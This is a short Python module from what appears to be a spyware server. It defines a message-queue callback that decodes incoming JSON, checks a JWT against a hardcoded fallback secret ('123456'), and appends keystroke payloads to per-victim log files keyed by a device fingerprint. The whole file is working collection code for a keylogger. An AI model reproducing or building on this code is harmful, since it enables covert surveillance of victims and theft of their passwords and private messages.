import os, json
import jwt
from spyware_server_common.config import get_config
from spyware_server_common.utils import createFolderIfNotExists, appendToFile

def validate_data (data) :
    return 'token' in data and 'payload' in data

def create_keylogging_callback (cursor):
    config = get_config()
    logs_dir = config.get('keyloggs_dir', './keyloggs')
    
    def keylogging_callback (ch, method, properties, body) :
        data = None

        ch.basic_ack(delivery_tag=method.delivery_tag)

        try :
            data = json.loads(body.decode())
        except :
            return

        if not validate_data(data) :
            return

        token = data.get('token')
        payload = data.get('payload')

        try :
            tokenData = jwt.decode(token.encode(), config.get('secrect', '123456'), algorithms=["HS256"])
        except Exception as ex:
            return

        if tokenData is None : return

        fp = tokenData.get('fp')
        createFolderIfNotExists(logs_dir)
        appendToFile(os.path.join(logs_dir, f'{fp}.txt'), payload.strip())

    return keylogging_callback